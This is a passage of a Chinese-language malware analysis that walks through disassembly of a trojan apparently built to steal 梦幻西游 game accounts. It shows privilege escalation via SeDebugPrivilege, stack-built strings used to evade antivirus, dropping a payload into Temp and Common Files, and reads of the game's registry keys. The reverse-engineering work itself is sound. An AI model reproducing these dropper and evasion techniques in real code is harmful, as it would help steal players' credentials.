+00402A66  /$  55            push    ebp  
+00402A67  |.  8BEC          mov     ebp, esp  
+00402A69  |.  83EC 1C       sub     esp, 1C  
+00402A6C  |.  8065 FE 00    and     byte ptr \[ebp-2\], 0  
+00402A70  |.  8065 F4 00    and     byte ptr \[ebp-C\], 0  
+00402A74  |.  8D45 E4       lea     eax, dword ptr \[ebp-1C\]  
+00402A77  |.  6A 01         push    1  
+00402A79  |.  50            push    eax  
+00402A7A  |.  C645 F8 6D    mov     byte ptr \[ebp-8\], 6D  
+00402A7E  |.  C645 F9 79    mov     byte ptr \[ebp-7\], 79  
+00402A82  |.  C645 FA 2E    mov     byte ptr \[ebp-6\], 2E  
+00402A86  |.  C645 FB 65    mov     byte ptr \[ebp-5\], 65  
+00402A8A  |.  C645 FC 78    mov     byte ptr \[ebp-4\], 78  
+00402A8E  |.  C645 FD 65    mov     byte ptr \[ebp-3\], 65             ;  my.exe  
+00402A92  |.  C645 E4 53    mov     byte ptr \[ebp-1C\], 53  
+00402A96  |.  C645 E5 65    mov     byte ptr \[ebp-1B\], 65  
+00402A9A  |.  C645 E6 44    mov     byte ptr \[ebp-1A\], 44  
+00402A9E  |.  C645 E7 65    mov     byte ptr \[ebp-19\], 65  
+00402AA2  |.  C645 E8 62    mov     byte ptr \[ebp-18\], 62  
+00402AA6  |.  C645 E9 75    mov     byte ptr \[ebp-17\], 75  
+00402AAA  |.  C645 EA 67    mov     byte ptr \[ebp-16\], 67  
+00402AAE  |.  C645 EB 50    mov     byte ptr \[ebp-15\], 50  
+00402AB2  |.  C645 EC 72    mov     byte ptr \[ebp-14\], 72  
+00402AB6  |.  C645 ED 69    mov     byte ptr \[ebp-13\], 69  
+00402ABA  |.  C645 EE 76    mov     byte ptr \[ebp-12\], 76  
+00402ABE  |.  C645 EF 69    mov     byte ptr \[ebp-11\], 69  
+00402AC2  |.  C645 F0 6C    mov     byte ptr \[ebp-10\], 6C  
+00402AC6  |.  C645 F1 65    mov     byte ptr \[ebp-F\], 65  
+00402ACA  |.  C645 F2 67    mov     byte ptr \[ebp-E\], 67  
+00402ACE  |.  C645 F3 65    mov     byte ptr \[ebp-D\], 65             ;  SeDebugPrivilege  
+00402AD2  |.  E8 58E9FFFF   call    0040142F           ------------>CALL 1  
+00402AD7  |.  8D45 F8       lea     eax, dword ptr \[ebp-8\]  
+00402ADA  |.  50            push    eax  
+00402ADB  |.  E8 A5E7FFFF   call    00401285           ------------>CALL 2  
+00402AE0  |.  83C4 0C       add     esp, 0C  
+00402AE3  |.  68 F4010000   push    1F4                              ; /Timeout = 500. ms  
+00402AE8  |.  FF15 0C504000 call    dword ptr \[<&kernel32.Sleep>\]    ; \\Sleep------->调用上面这两个 CALL 之后，睡眠 0.5S  
+00402AEE  |.  C9            leave  
+00402AEF  \\.  C3            retn  
+\~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~  
+由于代码较长，我就不在这里详解了，大家在下面可以跟踪进去看看，很简单~~我在说下我跟踪之后的详细结果吧!  
+call 0040142F 这里的 CALL 主要功能如下：  
+用 LoadLibraryA 加载 Advapi32.dll,然后在 Advapi32.dll 中，查找 OpenProcessToken,LookupPrivilegeValueA,AdjustTokenPrivileges 这三个函数的函数地址  
+得到这三个函数地址之后  
+再用 LoadLibraryA 加载 kernel32.dll，然后在 kernel32.dll 中，查找 CloseHandle,GetCurrentProcess 的函数地址，并调用 GetCurrentProcess 函数，得到当前程序的  
+  
+进程~~  
+再得到当前进程之后，用前面得到的三个函数地址，调用上面三个函数  
+OpenProcessToken,LookupPrivilegeValueA,AdjustTokenPrivileges 来进行权限提升，最后调用 CloseHandle 关闭句柄进程句柄  
+  
+call 00401285 这里的 CALL 主要功能如下：  
+用 LoadLibraryA 加载 kernel32.dll，然后在 kernel32.dll 中，查找 CreateToolhelp32Snapshot,Process32First,Process32Next,CloseHandle 这四个函数的函数地址得  
+  
+到这四个函数的地址之后  
+分别调用 CreateToolhelp32Snapshot,Process32First,Process32Next 进行进程查找，看有没有一个 my.exe 的进程，如果没有就调用 CloseHandle 关闭句柄  
+  
+\~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~  
+这样程序，刚开始的那个 CALL 00402A66 到这里就分析完成了~~~很简单不是吗?  
+\-----------------------------------------------------------------------------------------------------------------------------  
+  
+接着前面的分析吧~~~  
+0040370F  |.  BE 04010000   mov     esi, 104  
+00403714  |.  56            push    esi                          ; /size => 104 (260.)  
+00403715  |.  FF15 78504000 call    dword ptr \[<&msvcrt.malloc>\] ; \\malloc  
+0040371B  |.  8BF8          mov     edi, eax  
+0040371D  |.  56            push    esi                          ; /n  
+0040371E  |.  6A 00         push    0                            ; |c = 00  
+00403720  |.  57            push    edi                          ; |s  
+00403721  |.  E8 EC0F0000   call    <jmp.&msvcrt.memset>         ; \\memset  
+00403726  |.  6A 00         push    0  
+00403728  |.  57            push    edi  
+00403729  |.  6A 06         push    6  
+0040372B  |.  E8 E4F3FFFF   call    00402B14       --------->关键 CALL  
+00403730  |.  57            push    edi                          ; /block  
+00403731  |.  FF15 74504000 call    dword ptr \[<&msvcrt.free>\]   ; \\free  
+  
+这段代码很有意思，先用 malloc 分配一段内存，然后用 memset 将这段内存清零，接着调用一个关键的 CALL 函数进行一些操作，最后调用 free 释放前面分配的内存!  
+  
+还是像前面一样，我们来看关键 CALL 都做了哪些工作吧!  
+CALL 00402B14---->这是我们这个主程序的关键，代码比较长，我就分析一下主程，分支我只介绍进行了哪些操作，缩短篇幅!  
+\--------------------------------------------------------------------------------------------------------------------------  
+00402B14  /$  55            push    ebp  
+00402B15  |.  8BEC          mov     ebp, esp  
+00402B17  |.  81EC 980A0000 sub     esp, 0A98  
+00402B1D  |.  53            push    ebx  
+00402B1E  |.  80A5 7CFAFFFF>and     byte ptr \[ebp-584\], 0  
+00402B25  |.  56            push    esi  
+00402B26  |.  57            push    edi  
+00402B27  |.  6A 40         push    40  
+00402B29  |.  33C0          xor     eax, eax  
+00402B2B  |.  5A            pop     edx  
+00402B2C  |.  8DBD 7DFAFFFF lea     edi, dword ptr \[ebp-583\]                     ;  edi = "88"  
+00402B32  |.  8BCA          mov     ecx, edx                                     ;  ecx = edx = 40  
+00402B34  |.  80A5 6CF6FFFF>and     byte ptr \[ebp-994\], 0  
+00402B3B  |.  F3:AB         rep     stos dword ptr es:\[edi\]                      ;  将指定地址处数据清零  
+00402B3D  |.  66:AB         stos    word ptr es:\[edi\]  
+00402B3F  |.  AA            stos    byte ptr es:\[edi\]  
+00402B40  |.  8BCA          mov     ecx, edx  
+00402B42  |.  33C0          xor     eax, eax  
+00402B44  |.  8DBD 6DF6FFFF lea     edi, dword ptr \[ebp-993\]  
+00402B4A  |.  80A5 4CFEFFFF>and     byte ptr \[ebp-1B4\], 0  
+00402B51  |.  F3:AB         rep     stos dword ptr es:\[edi\]  
+00402B53  |.  66:AB         stos    word ptr es:\[edi\]  
+00402B55  |.  AA            stos    byte ptr es:\[edi\]  
+00402B56  |.  8BCA          mov     ecx, edx  
+00402B58  |.  33C0          xor     eax, eax  
+.............  
+.............  
+00402BD0  |.  8DBD 79F9FFFF lea     edi, dword ptr \[ebp-687\]  
+00402BD6  |.  6A 10         push    10  
+00402BD8  |.  F3:AB         rep     stos dword ptr es:\[edi\]  
+00402BDA  |.  66:AB         stos    word ptr es:\[edi\]  
+00402BDC  |.  AA            stos    byte ptr es:\[edi\]  
+上面的代码将 ebp 相对应的一些位置的数据清零，可能用于存放新的数据!  
+00402BDE  |.  BE 70604000   mov     esi, 00406070                                ;  esi = 00406070  
+00402BE3  |.  8DBD 88FDFFFF lea     edi, dword ptr \[ebp-278\]                     ;  edi = 0012FC80  
+00402BE9  |.  C645 A8 43    mov     byte ptr \[ebp-58\], 43  
+00402BED  |.  F3:A5         rep     movs dword ptr es:\[edi\], dword ptr \[esi\]  
+这里将 00406070 处的数据拷贝到 0012FC80 处~~~  
+我们来看看 00406070 处是些什么东西吧!  
+![](img/05d0548e0de02e456bca55772186a512.jpg)  
+嘿嘿，看到了吧，我们又我了一个信息----可能这个木马是用来盗取用户梦幻西游的帐号的（这里只是猜测，可能还有其它游戏的，嘿嘿）  
+继续单步吧~~  
+当执行完 00402BED 后，会将注册表中的关于梦幻西游的安装信息拷贝到 0012FC80 的堆栈中  
+![](img/8b4103cbefe1f2297e44771b72943945.jpg)  
+再单步执行吧!来到如下代码处:  
+00402BEF  |.  C645 A9 6F    mov     byte ptr \[ebp-57\], 6F  
+00402BF3  |.  C645 AA 70    mov     byte ptr \[ebp-56\], 70  
+00402BF7  |.  C645 AB 79    mov     byte ptr \[ebp-55\], 79  
+00402BFB  |.  C645 AC 46    mov     byte ptr \[ebp-54\], 46  
+00402BFF  |.  C645 AD 69    mov     byte ptr \[ebp-53\], 69  
+00402C03  |.  C645 AE 6C    mov     byte ptr \[ebp-52\], 6C  
+00402C07  |.  C645 AF 65    mov     byte ptr \[ebp-51\], 65  
+00402C0B  |.  C645 B0 41    mov     byte ptr \[ebp-50\], 41                        ;  CopyFileA  
+00402C0F  |.  A4            movs    byte ptr es:\[edi\], byte ptr \[esi\]  
+00402C10  |.  C645 8C 49    mov     byte ptr \[ebp-74\], 49  
+00402C14  |.  C645 8D 6E    mov     byte ptr \[ebp-73\], 6E  
+00402C18  |.  C645 8E 73    mov     byte ptr \[ebp-72\], 73  
+00402C1C  |.  8B7D 0C       mov     edi, dword ptr \[ebp+C\]  
+00402C1F  |.  8065 9B 00    and     byte ptr \[ebp-65\], 0  
+00402C23  |.  8065 BB 00    and     byte ptr \[ebp-45\], 0  
+00402C27  |.  8065 C1 00    and     byte ptr \[ebp-3F\], 0  
+00402C2B  |.  8D45 BC       lea     eax, dword ptr \[ebp-44\]  
+00402C2E  |.  6A 76         push    76  
+00402C30  |.  50            push    eax  
+00402C31  |.  57            push    edi  
+00402C32  |.  C645 8F 74    mov     byte ptr \[ebp-71\], 74  
+00402C36  |.  C645 90 61    mov     byte ptr \[ebp-70\], 61  
+00402C3A  |.  C645 91 6C    mov     byte ptr \[ebp-6F\], 6C  
+00402C3E  |.  C645 92 6C    mov     byte ptr \[ebp-6E\], 6C  
+00402C42  |.  C645 93 4C    mov     byte ptr \[ebp-6D\], 4C  
+00402C46  |.  C645 94 6F    mov     byte ptr \[ebp-6C\], 6F  
+00402C4A  |.  C645 95 63    mov     byte ptr \[ebp-6B\], 63  
+00402C4E  |.  C645 96 61    mov     byte ptr \[ebp-6A\], 61  
+00402C52  |.  C645 97 74    mov     byte ptr \[ebp-69\], 74  
+00402C56  |.  C645 98 69    mov     byte ptr \[ebp-68\], 69  
+00402C5A  |.  C645 99 6F    mov     byte ptr \[ebp-67\], 6F  
+00402C5E  |.  C645 9A 6E    mov     byte ptr \[ebp-66\], 6E                        ;  InstallLocation  
+00402C62  |.  C645 B4 5C    mov     byte ptr \[ebp-4C\], 5C  
+00402C66  |.  C645 B5 6D    mov     byte ptr \[ebp-4B\], 6D  
+00402C6A  |.  C645 B6 79    mov     byte ptr \[ebp-4A\], 79  
+00402C6E  |.  C645 B7 2E    mov     byte ptr \[ebp-49\], 2E  
+00402C72  |.  C645 B8 65    mov     byte ptr \[ebp-48\], 65  
+00402C76  |.  C645 B9 78    mov     byte ptr \[ebp-47\], 78  
+00402C7A  |.  C645 BA 65    mov     byte ptr \[ebp-46\], 65  
+00402C7E  |.  C645 BC 6D    mov     byte ptr \[ebp-44\], 6D  
+00402C82  |.  C645 BD 73    mov     byte ptr \[ebp-43\], 73  
+00402C86  |.  C645 BE 63    mov     byte ptr \[ebp-42\], 63  
+00402C8A  |.  C645 BF 72    mov     byte ptr \[ebp-41\], 72  
+00402C8E  |.  C645 C0 6F    mov     byte ptr \[ebp-40\], 6F                        ;  \\my.exe.mscro  
+00402C92  |.  E8 C7F8FFFF   call    0040255E  
+上面的代码只是为将函数各个字母一个一个的压入堆栈之后，组合成一个函数，这可能是为了免杀的作用吧!  
+在进行完这种操作之后，调用了一个函数 CALL 0040255E，于是我们跟踪进入看看 0040255E 究竟在做什么工作吧!  
+\~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~  
+由于代码较长，我就不在这里进行详细讲解了，我将我的分析结果贴出来吧~~  
+CALL 0040255E 进行了以下工作!  
+首先用 LoadLibraryA 加载 kernel32.dll 这个动态链接库，然后得到如下字符串:  
+GetTempPathA,FindResourceA,SizeOfResource,LoadResource,LockResource,FreeResource  
+当得到这些字符串之后，调用一个函数来得到上面这些函数的地址，还得到另外一个 SetHandleCount 的函数地址，并调用 GetTempPath 获得临时目录然后调用  
+  
+srand,time,rand 等函数得到一个随机的文件名之后，调用 GetModuleHandleA 上面这些工作完成之后，调用 FindResourceA 和 LoadResource 来查找程序中的资源!再调用  
+  
+SetHandleCount（这里我不知道为什么要调用它），最后调用 SizeOfResource 函数计算资源的大小!!!  
+  
+下面接着用 LoadLibraryA 函数加载 kernel32.dll，然后得到 CreateFileA 和 CloseHandle 这两个函数的函数地址,得到函数地址之后，调用 CreateFileA 来创建一个随机  
+  
+生成的文件名，在临时目录下生成一个随机的文件!  
+  
+然后用 WriteFile 写文件，并用 FlushFileBuffers 来清除缓冲区中的数据,最后调用 CloseHandle 关闭文件句柄，并用 FreeResource 释放资源!  
+  
+\~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~  
+接着上面的分析~~  
+  
+不好意思，昨天搞到晚上四点了，实在搞不下去了，有点累，今天接着继续~~~  
+  
+00402C97  |.  83C4 0C       add     esp, 0C                      ;  恢复堆栈  
+00402C9A  |.  85C0          test    eax, eax                     ;  判断前面的 CALL 0040255E 是否调用成功  
+00402C9C  |.  74 07         je      short 00402CA5               ;  如果失败，则直接返回，不调用后面的一系列操作  
+00402C9E  |.  57            push    edi                          ;  edi = "C:\\DOCUME~1\\jack\\LOCALS~1\\Temp\\kb011595.sve"  
+00402C9F  |.  E8 F0FBFFFF   call    00402894                     ;  ------>跟进去看看  
+这里在临时目录下生成了一个文件之后，进行了一个 CALL 00402894，我们来看看它做了什么工作~~~  
+\~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~  
+CALL 00402894 进行了以下工作!  
+调用 LoadLibraryA 加载 kernel32.dll  
+得到 GetModuleFileNameA,CloseHandle,CreateFileA 等函数的地址  
+调用 GetModuleFileNameA 得到文件路径（是程序文件路径）  
+调用 CreateFileA，并以 GENERIC\_READ 方式打开文件  
+调用 SetFilePointer 指针，得到要进行操作的数据长度  
+调用 ReadFile 从文件中读取刚才得到的在文件中位置的数据(这里分两次读取，每次读取的 size = 4)  
+读取完成之后，在重新调用 SetFilePointer 进行文件位置缓冲的调整  
+调用 malloc 和 memset 分配一个内存空间，并清空（我调试的 size = 0）  
+然后用 ReadFile 读取文件----->这里返回失败~~~因为前面的参数有误，我不知道是为什么  
+然后调用 CreateFileA 打开文件（这里的文件是我们前面在临时目录下生成的文件 kb011595.sve）,并以 GENERIC\_READ and GENERIC\_WRITE 方式  
+调用 SetFilePointer 定位文件，从文件 2 开始偏移 68 的位置  
+打开文件之后，会在里面用一个嵌套循环，并生成一些随机的数据，调用 WriteFile 写入到 kb011595.sve 文件中  
+再接着调用三个 WriteFile 写入数据（在我的电脑上第一个 WriteFile 返回失败，第二个，第三个成功）  
+写入数据完成以后，会调用 CloseHandle 关闭前面打开的 kb0011595 这个文件句柄，然后调用 free 释放掉前面分配的内存  
+然后调用 CloseHandle 关闭前面打开的程序文件句柄  
+\~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~  
+总之上面这个函数的主要功能就是打开主程序，然后再通过一定的方式，向生成的临时文件中写入数据，直于写入了什么信息，可以用 UE 之类的工具随便看看，嘿嘿!  
+  
+（作者可能会对这些数据加密，不过可以看看，不要放过任何可用的信息）  
+用 UE 打开之后，我得到了这些信息：  
+\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*  
+可能是这个 PE 文件---因为有 PE 头等相关结构  
+可能用 UPX 加过壳---因为看到了 UPX0,UPX1..等字样  
+调用了一些函数：LoadLibraryA,GetProceAddress,VirtualProtect,VirtualAlloc,VirtualFree,BitBlt,atoi,GetDC，从这些函数我想可能进行了一些图像操作，以  
+  
+及壳的代码函数  
+\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*  
+（在我的电脑上，没写入数据之前 kb011595.sve 大小为 20.0kb，写入数据之后变成了 64.9kb）  
+  
+好了，接着继续吧~~  
+00402CA4  |.  59            pop     ecx  
+00402CA5  |>  57            push    edi                        ;  edi = "C:\\DOCUME~1\\jack\\LOCALS~1\\Temp\\kb011595.sve"  
+00402CA6  |.  E8 D9EAFFFF   call    00401784                   ;  取上面的文件的路径字符串，返回路径长度  
+00402CAB  |.  85C0          test    eax, eax                   ;  判断前面的 CALL 00401784 是否成功  
+00402CAD  |.  59            pop     ecx  
+00402CAE  |.  0F84 07060000 je      004032BB                   ;  不成功，则直接返回，不进行下面的操作  
+00402CB4  |.  8B35 00504000 mov     esi, dword ptr \[<&kernel32>;  kernel32.LoadLibraryA  
+00402CBA  |.  8D45 A8       lea     eax, dword ptr \[ebp-58\]    ;  CopyFileA  
+00402CBD  |.  BB 10604000   mov     ebx, 00406010              ;  ASCII "Kernel32.dll"  
+00402CC2  |.  50            push    eax  
+00402CC3  |.  53            push    ebx                        ; /FileName => "Kernel32.dll"  
+00402CC4  |.  FFD6          call    esi                        ; \\LoadLibraryA  
+00402CC6  |.  50            push    eax  
+00402CC7  |.  E8 54ECFFFF   call    00401920  
+00402CCC  |.  8945 C8       mov     dword ptr \[ebp-38\], eax    ;  kernel32.CopyFileA  
+00402CCF  |.  8D45 B4       lea     eax, dword ptr \[ebp-4C\]    ;  \\my.exe  
+00402CD2  |.  50            push    eax  
+00402CD3  |.  8D45 8C       lea     eax, dword ptr \[ebp-74\]    ;  InstallLocation  
+00402CD6  |.  8065 A7 00    and     byte ptr \[ebp-59\], 0  
+00402CDA  |.  50            push    eax  
+00402CDB  |.  8D85 88FDFFFF lea     eax, dword ptr \[ebp-278\]   ;  SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Uninstall\\梦幻西游\_is1  
+00402CE1  |.  C645 9C 64    mov     byte ptr \[ebp-64\], 64  
+00402CE5  |.  50            push    eax  
+00402CE6  |.  8D85 84FCFFFF lea     eax, dword ptr \[ebp-37C\]  
+00402CEC  |.  68 02000080   push    80000002  
+00402CF1  |.  50            push    eax  
+00402CF2  |.  C645 9D 62    mov     byte ptr \[ebp-63\], 62  
+00402CF6  |.  C645 9E 67    mov     byte ptr \[ebp-62\], 67  
+00402CFA  |.  C645 9F 68    mov     byte ptr \[ebp-61\], 68  
+00402CFE  |.  C645 A0 65    mov     byte ptr \[ebp-60\], 65  
+00402D02  |.  C645 A1 6C    mov     byte ptr \[ebp-5F\], 6C  
+00402D06  |.  C645 A2 70    mov     byte ptr \[ebp-5E\], 70  
+00402D0A  |.  C645 A3 2E    mov     byte ptr \[ebp-5D\], 2E  
+00402D0E  |.  C645 A4 62    mov     byte ptr \[ebp-5C\], 62  
+00402D12  |.  C645 A5 65    mov     byte ptr \[ebp-5B\], 65  
+00402D16  |.  C645 A6 74    mov     byte ptr \[ebp-5A\], 74      ;  dbghelp.bet  
+00402D1A  |.  E8 34F1FFFF   call    00401E53           -------->这里又调用了一个 CALL  
+上面的代码好像是调用 InstallLocation 获取梦幻西游戏的注册表的路径,然后取得了一个字符串 dbghelp.bet，之后进行一个 CALL，我们来分析一下这个 CALL 的作用吧  
+  
+\~~~  
+\~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~  
+CALL 00401E53 的主要功能如下：  
+00401E5B  |.  FF75 14       push    dword ptr \[ebp+14\]  
+00401E5E  |.  FF75 10       push    dword ptr \[ebp+10\]  
+00401E61  |.  FF75 0C       push    dword ptr \[ebp+C\]  
+00401E64  |.  FF75 08       push    dword ptr \[ebp+8\]  
+00401E67  |.  E8 55FCFFFF   call    00401AC1  
+这个函数先调用了一个 CALL 00401AC1 进行操作，前面传入了几个参数，我们来看看这个函数做了什么工作  
+&&&&&&&&&&&&&&&&&&&&&&&&&  
+00401AC1:  
+加载 advapi32.dll，然后得到 RegOpenKeyEx,RegQueryValueEx,RegCloseKey 三个函数的地址进行  
+然后调用 RegOpenKeyEx 打开注册表信息，就是上面梦幻西游的注册表，由于我的虚拟机中没有这个选项，所以 RegOpenKeyEx 直接返回失败，如果有的话，可能还会进  
+  
+行下一个的 RegQueryValueEx 操作，查找特定的注册表信息，然后进行一些操作，最后调用 RegCloseKey 关闭注册表  
+&&&&&&&&&&&&&&&&&&&&&&&&&  
+然后判断上面这个函数调用是否成功，如果成功，直接返回，不成功的话进行下面的操作:  
+用调 LoadLibraryA 加载 advapi32.dll，然后找到 RegOpenKeyExA,RegCloseKey 的函数地址  
+调用 RegOpenKeyExA 打开 HKEY\_CURRENT\_USER\\Software\\Microsoft\\Windows\\ShellNoRoam\\MUICache 注册表  
+然后又调用了一个函数 CALL 00401C79  
+\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*  
+CALL 00401C79 主要功能：  
+调用 LoadLibraryA 加载 advapi32.dll  
+然后得到 RegQueryInfoKeyA,RegEnumValueA,RegCloseKey 这三个函数的信息  
+最后调用 RegQueryInforKeyA,RegEnumValueA 查找这个注册表项中有没有\\my.exe 的值，如果没有调用 RegCloseKey,并返回  
+\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*  
+这个函数调用完成之后，返回到 0040202D 处，然后调用 RegCloseKey 关闭前面打开的 HKEY\_CURRENT\_USER\\Software\\Microsoft\\Windows\\ShellNoRoam\\MUICache 的注册  
+  
+表项  
+这样 CALL 00401E53 这个函数的功能也分析完成了!!  
+\~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~  
+.......  
+单步跟踪，中间有几个大跳转，可能是我的电脑上没有相关的游戏所导致的，但不影响我们后面的分析，我们直接单步，来到如下地址处：  
+00403078  |.  50            push    eax                                ; /maxlen  
+00403079  |.  8D85 50FFFFFF lea     eax, dword ptr \[ebp-B0\]            ; |  
+0040307F  |.  57            push    edi                                ; |kb0011595.sve  
+00403080  |.  50            push    eax                                ; |dest  
+00403081  |.  FF15 A0504000 call    dword ptr \[<&msvcrt.strncpy>\]      ; \\strncpy  
+00403087  |.  8D85 50FFFFFF lea     eax, dword ptr \[ebp-B0\]            ;  得到前面的文件名字符串，后面的后缀舍去  
+0040308D  |.  68 6C604000   push    0040606C                           ;  ASCII "bwb"  
+00403092  |.  50            push    eax  
+00403093  |.  E8 02E7FFFF   call    0040179A                           ;  字符连接函数，将 kb011595.与 bwb 进行连接组成 kb011595.bwb  
+00403098  |.  8D85 50FFFFFF lea     eax, dword ptr \[ebp-B0\]  
+0040309E  |.  50            push    eax  
+0040309F  |.  8D85 78F9FFFF lea     eax, dword ptr \[ebp-688\]           ;  kb011595.bwb  
+004030A5  |.  50            push    eax  
+004030A6  |.  E8 F8E5FFFF   call    004016A3                           ;  字符串拷贝函数  
+004030AB  |.  80A5 CCFDFFFF>and     byte ptr \[ebp-234\], 0  
+004030B2  |.  83C4 28       add     esp, 28  
+004030B5  |.  33C0          xor     eax, eax  
+004030B7  |.  8DBD CDFDFFFF lea     edi, dword ptr \[ebp-233\]           ;  kb011595.sve  
+004030BD  |.  6A 1F         push    1F  
+004030BF  |.  59            pop     ecx  
+004030C0  |.  F3:AB         rep     stos dword ptr es:\[edi\]  
+004030C2  |.  66:AB         stos    word ptr es:\[edi\]  
+004030C4  |.  AA            stos    byte ptr es:\[edi\]  
+004030C5  |.  8D85 CCFDFFFF lea     eax, dword ptr \[ebp-234\]  
+004030CB  |.  50            push    eax  
+004030CC  |.  33C0          xor     eax, eax  
+004030CE  |.  50            push    eax  
+004030CF  |.  50            push    eax  
+004030D0  |.  6A 2B         push    2B  
+004030D2  |.  50            push    eax  
+004030D3  |.  FF15 E0504000 call    dword ptr \[<&shell32.SHGetFolderPa>;  SHGetFolderPathA  
+004030D9  |.  85C0          test    eax, eax  
+004030DB  |.  7C 6E         jl      short 0040314B  
+004030DD  |.  8D45 CC       lea     eax, dword ptr \[ebp-34\]            ;  \\System  
+004030E0  |.  50            push    eax  
+004030E1  |.  8D85 CCFDFFFF lea     eax, dword ptr \[ebp-234\]           ;  C:\\Program Files\\Common Files  
+004030E7  |.  50            push    eax  
+004030E8  |.  E8 ADE6FFFF   call    0040179A                           ;  C;\\Program Files\\Common Files\\System  
+004030ED  |.  8D85 CCFDFFFF lea     eax, dword ptr \[ebp-234\]  
+004030F3  |.  50            push    eax  
+004030F4  |.  E8 CBE6FFFF   call    004017C4                           ;  查找文件 FindFirstFileA,FindClose  
+004030F9  |.  83C4 0C       add     esp, 0C  
+004030FC  |.  85C0          test    eax, eax  
+004030FE  |.  75 11         jnz     short 00403111  
+00403100  |.  8D85 CCFDFFFF lea     eax, dword ptr \[ebp-234\]  
+00403106  |.  50            push    eax  
+00403107  |.  E8 E4F9FFFF   call    00402AF0                           ;  如果查找文件调用失败，就创建这个目录  
+0040310C  |.  85C0          test    eax, eax  
+0040310E  |.  59            pop     ecx  
+0040310F  |.  74 3A         je      short 0040314B  
+00403111  |>  8D85 CCFDFFFF lea     eax, dword ptr \[ebp-234\]  
+00403117  |.  50            push    eax  
+00403118  |.  8D85 4CFEFFFF lea     eax, dword ptr \[ebp-1B4\]  
+0040311E  |.  50            push    eax  
+0040311F  |.  E8 76E6FFFF   call    0040179A  
+00403124  |.  8D85 4CFEFFFF lea     eax, dword ptr \[ebp-1B4\]  
+0040312A  |.  68 5C604000   push    0040605C  
+0040312F  |.  50            push    eax                                ;  C:\\Program Files\\Common Files\\System  
+00403130  |.  E8 65E6FFFF   call    0040179A  
+00403135  |.  8D85 78F9FFFF lea     eax, dword ptr \[ebp-688\]           ;  kb011595.bwb  
+0040313B  |.  50            push    eax  
+0040313C  |.  8D85 4CFEFFFF lea     eax, dword ptr \[ebp-1B4\]           ;  C:\\Program Files\\Common Files\\System  
+00403142  |.  50            push    eax  
+00403143  |.  E8 52E6FFFF   call    0040179A                           ;  C:\\Program Files\\Common Files\\System\\kb011595.bwb  
+00403148  |.  83C4 18       add     esp, 18  
+0040314B  |>  8D85 4CFEFFFF lea     eax, dword ptr \[ebp-1B4\]           ;  堆栈地址=0012FD44 C:\\Program Files\\Common Files\\System\\kb011595.bwb  
+00403151  |.  50            push    eax  
+00403152  |.  E8 2DE6FFFF   call    00401784  
+00403157  |.  85C0          test    eax, eax  
+00403159  |.  59            pop     ecx  
+0040315A  |.  0F84 FE000000 je      0040325E  
+00403160  |.  8D85 4CFEFFFF lea     eax, dword ptr \[ebp-1B4\]  
+00403166  |.  68 80000000   push    80                                 ; /FileAttributes = NORMAL  
+0040316B  |.  50            push    eax                                ; |FileName  
+0040316C  |.  FF15 24504000 call    dword ptr \[<&kernel32.SetFileAttri>; \\SetFileAttributesA  
+00403172  |.  8D85 4CFEFFFF lea     eax, dword ptr \[ebp-1B4\]  
+00403178  |.  6A 00         push    0  
+0040317A  |.  50            push    eax                                ;  C:\\Program Files\\Common Files\\System\\kb011595.bwb  
+0040317B  |.  FF75 0C       push    dword ptr \[ebp+C\]                  ;  C:\\DOCUME~1\\jack\\LOCALS~1\\Temp\\kb011595.sve  
+0040317E  |.  FF55 C8       call    dword ptr \[ebp-38\]                 ;  CopyFileA  
+00403181  |.  85C0          test    eax, eax  
+00403183  |.  0F84 D1000000 je      0040325A  
+00403189  |.  8065 FE 00    and     byte ptr \[ebp-2\], 0  
+0040318D  |.  8065 EA 00    and     byte ptr \[ebp-16\], 0  
+00403191  |.  8D45 EC       lea     eax, dword ptr \[ebp-14\]  
+00403194  |.  C645 EC 47    mov     byte ptr \[ebp-14\], 47  
+00403198  |.  50            push    eax  
+00403199  |.  53            push    ebx  
+0040319A  |.  C645 ED 65    mov     byte ptr \[ebp-13\], 65  
+0040319E  |.  C645 EE 74    mov     byte ptr \[ebp-12\], 74  
+004031A2  |.  C645 EF 46    mov     byte ptr \[ebp-11\], 46  
+004031A6  |.  C645 F0 69    mov     byte ptr \[ebp-10\], 69  
